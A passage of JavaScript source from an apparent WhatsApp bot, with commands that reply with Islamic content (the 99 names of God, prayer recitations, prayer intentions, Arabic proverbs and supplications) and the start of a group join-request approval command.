        arabic: "الْحَقُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Benar",
        translation_en: "The Truth, the Real"
    },
    {
        index: 52,
        latin: "Al Wakiil",
        arabic: "الْوَكِيلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memelihara",
        translation_en: "The Trustee, the Dependable"
    },
    {
        index: 53,
        latin: "Al Qawiyyu",
        arabic: "الْقَوِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Kuat",
        translation_en: "The Strong"
    },
    {
        index: 54,
        latin: "Al Matiin",
        arabic: "الْمَتِينُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Kokoh",
        translation_en: "The Firm, the Steadfast"
    },
    {
        index: 55,
        latin: "Al Waliyy",
        arabic: "الْوَلِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Melindungi",
        translation_en: "The Protecting Friend, Patron, and Helper"
    },
    {
        index: 56,
        latin: "Al Hamiid",
        arabic: "الْحَمِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Terpuji",
        translation_en: "The All Praiseworthy"
    },
    {
        index: 57,
        latin: "Al Mushii",
        arabic: "الْمُحْصِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengkalkulasi",
        translation_en: "The Accounter, the Numberer of All"
    },
    {
        index: 58,
        latin: "Al Mubdi’",
        arabic: "الْمُبْدِئُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memulai",
        translation_en: "The Producer, Originator, and Initiator of all"
    },
    {
        index: 59,
        latin: "Al Mu’iid",
        arabic: "الْمُعِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaMengembalikan Kehidupan",
        translation_en: "The Reinstater Who Brings Back All"
    },
    {
        index: 60,
        latin: "Al Muhyii",
        arabic: "الْمُحْيِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menghidupkan",
        translation_en: "The Giver of Life"
    },
    {
        index: 61,
        latin: "Al Mumiitu",
        arabic: "اَلْمُمِيتُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mematikan",
        translation_en: "The Bringer of Death, the Destroyer"
    },
    {
        index: 62,
        latin: "Al Hayyu",
        arabic: "الْحَيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Hidup",
        translation_en: "The Ever Living"
    },
    {
        index: 63,
        latin: "Al Qayyuum",
        arabic: "الْقَيُّومُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mandiri",
        translation_en: "The Self Subsisting Sustainer of All"
    },
    {
        index: 64,
        latin: "Al Waajid",
        arabic: "الْوَاجِدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penemu",
        translation_en: "The Perceiver, the Finder, the Unfailing"
    },
    {
        index: 65,
        latin: "Al Maajid",
        arabic: "الْمَاجِدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
        translation_en: "The Illustrious, the Magnificent"
    },
    {
        index: 66,
        latin: "Al Wahiid",
        arabic: "الْواحِدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Tunggal",
        translation_en: "The One, The Unique, Manifestation of Unity"
    },
    {
        index: 67,
        latin: "Al ‘Ahad",
        arabic: "اَلاَحَدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Esa",
        translation_en: "The One, the All Inclusive, the Indivisible"
    },
    {
        index: 68,
        latin: "As Shamad",
        arabic: "الصَّمَدُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaDibutuhkan, Tempat Meminta",
        translation_en: "The Self Sufficient, the Impregnable,the Eternally Besought of All, the Everlasting"
    },
    {
        index: 69,
        latin: "Al Qaadir",
        arabic: "الْقَادِرُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaMenentukan, Maha Menyeimbangkan",
        translation_en: "The All Able"
    },
    {
        index: 70,
        latin: "Al Muqtadir",
        arabic: "الْمُقْتَدِرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Berkuasa",
        translation_en: "The All Determiner, the Dominant"
    },
    {
        index: 71,
        latin: "Al Muqaddim",
        arabic: "الْمُقَدِّمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mendahulukan",
        translation_en: "The Expediter, He who brings forward"
    },
    {
        index: 72,
        latin: "Al Mu’akkhir",
        arabic: "الْمُؤَخِّرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengakhirkan",
        translation_en: "The Delayer, He who puts far away"
    },
    {
        index: 73,
        latin: "Al Awwal",
        arabic: "الأوَّلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Awal",
        translation_en: "The First"
    },
    {
        index: 74,
        latin: "Al Aakhir",
        arabic: "الآخِرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Akhir",
        translation_en: "The Last"
    },
    {
        index: 75,
        latin: "Az Zhaahir",
        arabic: "الظَّاهِرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Nyata",
        translation_en: "The Manifest; the All Victorious"
    },
    {
        index: 76,
        latin: "Al Baathin",
        arabic: "الْبَاطِنُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Ghaib",
        translation_en: "The Hidden; the All Encompassing"
    },
    {
        index: 77,
        latin: "Al Waali",
        arabic: "الْوَالِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memerintah",
        translation_en: "The Patron"
    },
    {
        index: 78,
        latin: "Al Muta’aalii",
        arabic: "الْمُتَعَالِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
        translation_en: "The Self Exalted"
    },
    {
        index: 79,
        latin: "Al Barri",
        arabic: "الْبَرُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penderma",
        translation_en: "The Most Kind and Righteous"
    },
    {
        index: 80,
        latin: "At Tawwaab",
        arabic: "التَّوَابُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penerima Tobat",
        translation_en: "The Ever Returning, Ever Relenting"
    },
    {
        index: 81,
        latin: "Al Muntaqim",
        arabic: "الْمُنْتَقِمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penuntut Balas",
        translation_en: "The Avenger"
    },
    {
        index: 82,
        latin: "Al Afuww",
        arabic: "العَفُوُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemaaf",
        translation_en: "The Pardoner, the Effacer of Sins"
    },
    {
        index: 83,
        latin: "Ar Ra`uuf",
        arabic: "الرَّؤُوفُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pengasih",
        translation_en: "The Compassionate, the All Pitying"
    },
    {
        index: 84,
        latin: "Malikul Mulk",
        arabic: "مَالِكُ الْمُلْكِ",
        translation_id: "Yang Memiliki Mutlak sifatPenguasa Kerajaan (Semesta)",
        translation_en: "The Owner of All Sovereignty"
    },
    {
        index: 85,
        latin: "Dzul JalaaliWal Ikraam",
        arabic: "ذُوالْجَلاَلِوَالإكْرَامِ",
        translation_id: "Yang Memiliki Mutlak sifat PemilikKebesaran dan Kemuliaan",
        translation_en: "The Lord of Majesty and Generosity"
    },
    {
        index: 86,
        latin: "Al Muqsith",
        arabic: "الْمُقْسِطُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
        translation_en: "The Equitable, the Requiter"
    },
    {
        index: 87,
        latin: "Al Jamii’",
        arabic: "الْجَامِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengumpulkan",
        translation_en: "The Gatherer, the Unifier"
    },
    {
        index: 88,
        latin: "Al Ghaniyy",
        arabic: "الْغَنِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Berkecukupan",
        translation_en: "The All Rich, the Independent"
    },
    {
        index: 89,
        latin: "Al Mughnii",
        arabic: "الْمُغْنِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Kekayaan",
        translation_en: "The Enricher, the Emancipator"
    },
    {
        index: 90,
        latin: "Al Maani",
        arabic: "اَلْمَانِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mencegah",
        translation_en: "The Withholder, the Shielder, the Defender"
    },
    {
        index: 91,
        latin: "Ad Dhaar",
        arabic: "الضَّارَّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Derita",
        translation_en: "The Distressor, the Harmer"
    },
    {
        index: 92,
        latin: "An Nafii’",
        arabic: "النَّافِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Manfaat",
        translation_en: "The Propitious, the Benefactor"
    },
    {
        index: 93,
        latin: "An Nuur",
        arabic: "النُّورُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Bercahaya(Menerangi, Memberi Cahaya)",
        translation_en: "The Light"
    },
    {
        index: 94,
        latin: "Al Haadii",
        arabic: "الْهَادِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Petunjuk",
        translation_en: "The Guide"
    },
    {
        index: 95,
        latin: "Al Baadii",
        arabic: "الْبَدِيعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pencipta",
        translation_en: "Incomparable, the Originator"
    },
    {
        index: 96,
        latin: "Al Baaqii",
        arabic: "اَلْبَاقِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Kekal",
        translation_en: "The Ever Enduring and Immutable"
    },
    {
        index: 97,
        latin: "Al Waarits",
        arabic: "الْوَارِثُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pewaris",
        translation_en: "The Heir, the Inheritor of All"
    },
    {
        index: 98,
        latin: "Ar Rasyiid",
        arabic: "الرَّشِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pandai",
        translation_en: "The Guide, Infallible Teacher, and Knower"
    },
    {
        index: 99,
        latin: "As Shabuur",
        arabic: "الصَّبُورُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Sabar",
        translation_en: "The Patient"
    }
]
    let json = JSON.parse(JSON.stringify(asmaulhusna))
    let data = json.map((v, i) => `${i + 1}. ${v.latin}\n${v.arabic}\n${v.translation_id}`).join('\n\n')
    if (isNaN(args[0])) return reply (`contoh:\nasmaulhusna 1`)
    if (args[0]) {
        if (args[0] < 1 || args[0] > 99) throw `minimal 1 & maksimal 99!`
        let { index, latin, arabic, translation_id, translation_en } = json.find(v => v.index == args[0].replace(/[^0-9]/g, ''))
        return reply(`No. ${index}
${arabic}
${latin}
${translation_id}
${translation_en}
`.trim())
    }
    reply(`${contoh} + ${data} + ${anjuran}`)
}
break   
case 'bacaansholat': {
if (isBan) return XRB()
await XReaction()
const bacaanshalat = {
"result": [
{
 "id": 1,
 "name": "Bacaan Iftitah",
 "arabic": "اللَّهُ أَكْبَرُ كَبِيرًا وَالْحَمْدُ لِلَّهِ كَثِيرًا وَسُبْحَانَ اللَّهِ بُكْرَةً وَأَصِيلاً , إِنِّى وَجَّهْتُ وَجْهِىَ لِلَّذِى فَطَرَ السَّمَوَاتِ وَالأَرْضَ حَنِيفًا وَمَا أَنَا مِنَ الْمُشْرِكِينَ إِنَّ صَلاَتِى وَنُسُكِى وَمَحْيَاىَ وَمَمَاتِى لِلَّهِ رَبِّ الْعَالَمِينَ لاَ شَرِيكَ لَهُ وَبِذَلِكَ أُمِرْتُ وَأَنَا أَوَّلُ الْمُسْلِمِينَ",
 "latin": "Alloohu akbar kabiirow wal hamdu lillaahi katsiiroo wasubhaanalloohi bukrotaw wa-ashiilaa, Innii wajjahtu wajhiya lilladzii fathoros samaawaati wal ardlo haniifaa wamaa ana minal musyrikiin. Inna sholaatii wa nusukii wamahyaa wa mamaatii lillaahi robbil &lsquo;aalamiin. Laa syariikalahu wa bidzaalika umirtu wa ana awwalul muslimiin",
 "terjemahan": "Allah Maha Besar dengan sebesar-besarnya, segala puji bagi Allah dengan pujian yang banyak. Mahasuci Allah pada waktu pagi dan petang, Sesungguhnya aku hadapkan wajahku kepada Allah yang telah menciptakan langit dan bumi dalam keadaan tunduk dan aku bukanlah dari golongan orang-orang musyrik. Sesungguhnya shalatku, sembelihanku, hidupku dan matiku hanya untuk Allah Tuhan semesta alam. Tidak ada sekutu bagiNya. Dan dengan yang demikian itu lah aku diperintahkan. Dan aku adalah orang yang pertama berserah diri"
},
{
 "id": 2,
 "name": "Al Fatihah",
 "arabic": "بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ ﴿١﴾الْحَمْدُ لِلَّـهِ رَبِّ الْعَالَمِينَ ﴿٢﴾ الرَّحْمَـٰنِ الرَّحِيمِ ﴿٣﴾ مَالِكِ يَوْمِ الدِّينِ ﴿٤﴾ إِيَّاكَ نَعْبُدُ وَإِيَّاكَ نَسْتَعِينُ ﴿٥﴾ اهْدِنَاالصِّرَاطَ الْمُسْتَقِيمَ ﴿٦﴾ صِرَاطَ الَّذِينَ أَنْعَمْتَ عَلَيْهِمْ غَيْرِ الْمَغْضُوبِ عَلَيْهِمْ وَلَا الضَّالِّينَ ﴿٧",
 "latin": "1. Bismillahirrahmanirrahim, 2. Alhamdulillahi rabbil alamin, 3. Arrahmaanirrahiim, 4. Maaliki yaumiddiin, 5. Iyyaka nabudu waiyyaaka nastaiin, 6. Ihdinashirratal mustaqim, 7. shiratalladzina an&rsquo;amta alaihim ghairil maghduubi alaihim waladhaalin",
 "terjemahan": "1. Dengan menyebut nama Allah Yang Maha Pemurah lagi Maha Penyayang, 2. Segala puji bagi Allah, Tuhan semesta alam, 3. Maha Pemurah lagi Maha Penyayang, 4. Yang menguasai di Hari Pembalasan, 5. Hanya Engkaulah yang kami sembah, dan hanya kepada Engkaulah kami meminta pertolongan, 6. Tunjukilah kami jalan yang lurus, 7. (yaitu) Jalan orang-orang yang telah Engkau beri nikmat kepada mereka; bukan (jalan) mereka yang dimurkai dan bukan (pula jalan) mereka yang sesat"
},
{
 "id": 3,
 "name": "Bacaan Ruku",
 "arabic": "(3x) سُبْحَانَ رَبِّيَ الْعَظِيْمِ وَبِحَمْدِهِ",
 "latin": "Subhana Rabbiyal Adzimi Wabihamdih (3x)",
 "terjemahan": "Maha Suci Tuhanku Yang Maha Agung Dan Dengan Memuji-Nya"
},
{
 "id": 4,
 "name": "Bacaan Sujud",
 "arabic": "(3x) سُبْحَانَ رَبِّىَ الْأَعْلَى وَبِحَمْدِهِ",
 "latin": "Subhaana robbiyal a'la wabihamdih (3x)",
 "terjemahan": "Mahasuci Tuhanku yang Mahatinggi dan segala puji bagiNya"
},
{
 "id": 5,
 "name": "Bacaan Duduk Diantara Dua Sujud",
 "arabic": "رَبِّ اغْفِرْلِيْ وَارْحَمْنِيْ وَاجْبُرْنِيْ وَارْفَعْنِيْ وَارْزُقْنِيْ وَاهْدِنِيْ وَعَافِنِيْ وَاعْفُ عَنِّيْ",
 "latin": "Rabbighfirli Warhamni Wajburnii Warfaknii Wazuqnii Wahdinii Wa'aafinii Wa'fuannii",
 "terjemahan": "Ya Allah,ampunilah dosaku,belas kasihinilah aku dan cukuplah segala kekuranganku da angkatlah derajatku dan berilah rezeki kepadaku,dan berilah aku petunjuk dan berilah kesehatan padaku dan berilah ampunan kepadaku"
},
{
 "id": 6,
 "name": "Duduk Tasyahud Awal",
 "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ",
 "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahummasholli ala Sayyidina Muhammad",
 "terjemahan": "Segala penghormatan, keberkahan, shalawat dan kebaikan hanya bagi Allah. Semoga salam sejahtera selalu tercurahkan kepadamu wahai Nabi, demikian pula rahmat Allah dan berkahNya dan semoga salam sejahtera selalu tercurah kepada kami dan hamba-hamba Allah yang shalih. Aku bersaksi bahwa tiada ilah kecuali Allah dan aku bersaksi bahwa Muhammad adalah utusan Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad"
},
{
 "id": 7,
 "name": "Duduk Tasyahud Akhir",
 "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ، كَمَا صَلَّيْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ وَبَارِكْ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ كَمَا بَرَكْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ فِى الْعَالَمِيْنَ إِنَّكَ حَمِيْدٌ مَجِيْدٌ",
 "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahumma Shalli Ala Sayyidina Muhammad Wa Ala Ali Sayyidina Muhammad. Kama Shollaita Ala Sayyidina Ibrahim wa alaa aali sayyidina Ibrahim, wabaarik ala Sayyidina Muhammad Wa Alaa Ali Sayyidina Muhammad, Kama barokta alaa Sayyidina Ibrahim wa alaa ali Sayyidina Ibrahim, Fil aalamiina innaka hamiidummajid",
 "terjemahan": "Segala penghormatan yang berkat solat yang baik adalah untuk Allah. Sejahtera atas engkau wahai Nabi dan rahmat Allah serta keberkatannya. Sejahtera ke atas kami dan atas hamba-hamba Allah yang soleh. Aku bersaksi bahwa tiada Tuhan melainkan Allah dan aku bersaksi bahwasanya Muhammad itu adalah pesuruh Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad dan ke atas keluarganya. Sebagaimana Engkau selawatkan ke atas Ibrahim dan atas keluarga Ibrahim. Berkatilah ke atas Muhammad dan atas keluarganya sebagaimana Engkau berkati ke atas Ibrahim dan atas keluarga Ibrahim di dalam alam ini. Sesungguhnya Engkau Maha Terpuji lagi Maha Agung"
},
{
 "id": 8,
 "name": "Salam",
 "arabic": "اَلسَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ",
 "latin": "Assalamualaikum Warohmatullahi Wabarokatuh",
 "terjemahan": "Semoga keselamatan, rohmat dan berkah ALLAH selalu tercurah untuk kamu sekalian."
}
]
}
let bacaan = JSON.stringify(bacaanshalat)
let json = JSON.parse(bacaan)
let data = json.result.map((v, i) => `${i + 1}. ${v.name}\n${v.arabic}\n${v.latin}\n*Artinya:*\n_"${v.terjemahan}"_`).join('\n\n')
let contoh = `*「 Bacaan Shalat 」*\n\n`
reply(`${contoh} + ${data}`)
}
break

case 'doaharian': {
if (isBan) return XRB()
await XReaction()
let src = JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/islami/doaharian.json', 'utf-8'))
let caption = src.map((v, i) => {
return `
*${i + 1}.* ${v.title}

❃ Latin :
${v.latin}

❃ Arabic :
${v.arabic}

❃ Translate :
${v.translation}
`.trim()
}).join('\n\n')
reply(`${caption}`)

}
break

case 'niatsholat': {
if (isBan) return XRB()
await XReaction()
if (!q) return reply(`Contoh Penggunaan :\nniatsholat Subuh`)
const niatsholat = [
{
index: 1,
solat: "subuh",
latin: "Ushalli fardhosh shubhi rok'ataini mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "اُصَلِّى فَرْضَ الصُّبْحِ رَكْعَتَيْنِ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu Shubuh dua raka'at menghadap kiblat karena Allah Ta'ala",
},
{
index: 2,
solat: "maghrib",
latin: "Ushalli fardhol maghribi tsalaata raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "اُصَلِّى فَرْضَ الْمَغْرِبِ ثَلاَثَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu Maghrib tiga raka'at menghadap kiblat karena Allah Ta'ala",
},
{
index: 3,
solat: "dzuhur",
latin: "Ushalli fardhodl dhuhri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "اُصَلِّى فَرْضَ الظُّهْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu Dzuhur empat raka'at menghadap kiblat karena Allah Ta'ala",
},
{
index: 4,
solat: "isha",
latin: "Ushalli fardhol 'isyaa-i arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "صَلِّى فَرْضَ الْعِشَاءِ اَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu Isya empat raka'at menghadap kiblat karena Allah Ta'ala",
},
{
index: 5,
solat: "ashar",
latin: "Ushalli fardhol 'ashri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "صَلِّى فَرْضَ الْعَصْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu 'Ashar empat raka'at menghadap kiblat karena Allah Ta'ala",
}
]
let text = q.toLowerCase() || ''
let data = Object.values(niatsholat).find(v => v.solat == text)
if (!data) return reply(`${txt} Tidak Ditemukan\n\nList Solat 5 Waktu :\n• Subuh\n• Maghrib\n• Dzuhur\n• Isha\n• Ashar`)
reply(`
_*Niat Sholat ${text}*_

*Arab :* ${data.arabic}

*Latin :* ${data.latin} 

*Translate :* ${data.translation_id}`.trim())
}

break

case 'quotesislami': {
if (isBan) return XRB()
await XReaction()
const islami = [
{
 "id": "1",
 "arabic": "مَنْ سَارَ عَلىَ الدَّرْبِ وَصَلَ",
 "arti": "Barang siapa berjalan pada jalannya, maka dia akan sampai (pada tujuannya)."
},
{
 "id": "2",
 "arabic": "مَنْ صَبَرَ ظَفِرَ",
 "arti": "Barang siapa bersabar, maka dia akan beruntung."
},
{
 "id": "3",
 "arabic": "مَنْ جَدَّ وَجَـدَ",
 "arti": "Barang siapa bersungguh-sungguh, maka dia akan meraih (kesuksesan)."
},
{
 "id": "4",
 "arabic": "جَالِسْ أَهْلَ الصِّدْقِ وَالوَفَاءِ",
 "arti": "Bergaulah bersama orang-orang yang jujur dan menepati janji."
},
{
 "id": "5",
 "arabic": "مَنْ قَلَّ صِدْقُهُ قَلَّ صَدِيْقُهُ",
 "arti": "Barang siapa sedikit kejujurannya, maka sedikit pulalah temannya."
},
{
 "id": 6,
 "arabic": "مَوَدَّةُ الصَّدِيْقِ تَظْهَرُ وَقْتَ الضِّيْقِ",
 "arti": "Kecintaan seorang teman itu akan terlihat pada waktu kesempitan."
},
{
 "id": "7",
 "arabic": "الصَّبْرُ يُعِيْنُ عَلَى كُلِّ عَمَلٍ",
 "arti": "Kesabaran akan menolong segala pekerjaan."
},
{
 "id": "8",
 "arabic": "وَمَا اللَّذَّةُ إِلاَّ بَعْدَ التَّعَبِ",
 "arti": "Tidak ada kenikmatan kecuali setelah kepayahan."
},
{
 "id": "9",
 "arabic": "جَرِّبْ وَلاَحِظْ تَكُنْ عَارِفًا",
 "arti": "Coba dan perhatikanlah, maka engkau akan menjadi orang yang tahu."
},
{
 "id": "10",
 "arabic": "بَيْضَةُ اليَوْمِ خَيْرٌ مِنْ دَجَاجَةِ الغَدِ",
 "arti": "Telur hari ini lebih baik daripada ayam esok hari."
},
{
 "id": "11",
 "arabic": "أُطْلُبِ الْعِلْمَ مِنَ الْمَهْدِ إِلَى الَّلحْدِ",
 "arti": "Carilah ilmu sejak dari buaian hingga liang lahat."
},
{
 "id": "12",
 "arabic": "الوَقْتُ أَثْمَنُ مِنَ الذَّهَبِ",
 "arti": "Waktu itu lebih berharga daripada emas."
},
{
 "id": "13",
 "arabic": "لاَ خَيْرَ فيِ لَذَّةٍ تَعْقِبُ نَدَماً",
 "arti": "Tak ada kebaikan bagi kenikmatan yang diiringi dengan penyesalan."
},
{
 "id": "14",
 "arabic": "أَخِي لَنْ تَنَالَ العِلْمَ إِلاَّ بِسِتَّةٍ سَأُنْبِيْكَ عَنْ تَفْصِيْلِهَا بِبَيَانٍ: ذَكَاءٌ وَحِرْصٌ وَاجْتِهَادٌ وَدِرْهَمٌ وَصُحْبَةُ أُسْتَاذٍ وَطُوْلُ زَمَانٍ",
 "arti": "Wahai saudaraku, Kamu tidak akan memperoleh ilmu kecuali dengan enam perkara, akan aku sampaikan rinciannya dengan jelas; 1) Kecerdasan, 2) Ketamaan (terhadap ilmu), 3) Kesungguhan, 4) Harta benda (sebagai bekal), 5) Bergaul dengan guru, 6) Waktu yang lama."
},
{
 "id": "15",
 "arabic": "لاَ تَكُنْ رَطْباً فَتُعْصَرَ وَلاَ يَابِسًا فَتُكَسَّرَ",
 "arti": "Janganlah kamu bersikap lemah, sehingga kamu mudah diperas. Dan janganlah kamu bersikap keras, sehingga kamu mudah dipatahkan."
},
{
 "id": "16",
 "arabic": "لِكُلِّ مَقَامٍ مَقَالٌ وَلِكُلِّ مَقَالٍ مَقَامٌ",
 "arti": "Setiap tempat memiliki perkataannya masing-masing, dan setiap perkataan memiliki tempatnya masing-masing."
},{
 "id": "17",
 "arabic": "خَيْرُ النَّاسِ أَحْسَنُهُمْ خُلُقاً وَأَنْفَعُهُمْ لِلنَّاسِ",
 "arti": "Sebaik-baik manusia adalah yang paling baik budi pekertinya dan yang paling bermanfaat bagi manusia lainnya."
},
{
 "id": "18",
 "arabic": "خَيْرُ جَلِيْسٍ في الزّمانِ كِتابُ",
 "arti": "Sebaik-baik teman duduk di setiap waktu adalah buku."
},
{
 "id": "19",
 "arabic": "مَنْ يَزْرَعْ يَحْصُدْ",
 "arti": "Barang siapa menanam, pasti ia akan memetik (mengetam)."
},
{
 "id": "20",
 "arabic": "لَوْلاَ العِلْمُ لَكَانَ النَّاسُ كَالبَهَائِمِ",
 "arti": "Kalaulah tidak karena ilmu, niscaya manusia itu seperti binatang."
},
{
 "id": "21",
 "arabic": "سَلاَمَةُ الإِنْسَانِ فيِ حِفْظِ اللِّسَانِ",
 "arti": "Keselamatan manusia itu terletak pada penjagaan lidahnya (perkataannya)."
},
{
"id": "22",
 "arabic": "الرِّفْقُ بِالضَّعِيْفِ مِنْ خُلُقِ الشَّرِيْفِ",
 "arti": "Berlaku lemah lembut kepada orang yang lemah itu termasuk akhlak orang yang mulia (terhormat)."
},
{
 "id": "23",
 "arabic": "وَعَامِلِ النَّاسَ بِمَا تُحِبُّ مِنْهُ دَائِماً",
 "arti": "Dan bergaullah dengan manusia dengan sikap yang kamu juga suka diperlakukan seperti itu."
},
{
 "id": "24",
 "arabic": "لَيْسَ الجَمَالُ بِأَثْوَابٍ تُزَيِّنُنُا إِنَّ الجَمَالَ جمَاَلُ العِلْمِ وَالأَدَبِ",
 "arti": "Kecantikan bukanlah dengan pakaian yang melekat menghiasi diri kita, sesungguhnya kecantikan ialah kecantikan dengan ilmu dan budi pekerti."
},
{
 "id": "25",
 "arabic": "مَنْ أَعاَنَكَ عَلىَ الشَّرِّ ظَلَمَكَ",
 "arti": "Barang siapa membantumu dalam kejahatan, maka sesungguhnya ia telah berbuat aniaya terhadapmu."
}
]
const randomIndex = Math.floor(Math.random() * islami.length);
const randomQuote = islami[randomIndex];
const { arabic, arti } = randomQuote;
reply(`${arabic}\n${arti}`)
}
break

case 'doatahlil': {
if (isBan) return XRB()
await XReaction()
let { result } = JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/islami/tahlil.json', 'utf-8'))
let caption = result.map((v, i) => {
return `
*${i + 1}.* ${v.title}

❃ Arabic :
${v.arabic}

❃ Translate :
${v.translation}
`.trim()
}).join('\n\n')
reply(`${caption}`)
}
break

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Islami Features End
//📈————————————————————————— [ Batas Fitur Sayangg ] —————————————————————————📉\\


//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Group Features
//📈————————————————————————— [ Features ↓↓ ] —————————————————————————📉\\
case 'acc': {
  if (!m.isGroup) return reply('❌ Hanya bisa di dalam grup.')
  if (!isAdmins && !isCreator) return reply('❌ Hanya admin atau owner bot.')

  const pending = await Alice.groupRequestParticipantsList(m.chat);
  if (pending.length === 0) return reply('✅ Tidak ada member yang minta bergabung.');

  if (args[0] === 'all') {
    await Alice.groupRequestParticipantsUpdate(m.chat, pending.map(u => u.jid), 'approve');
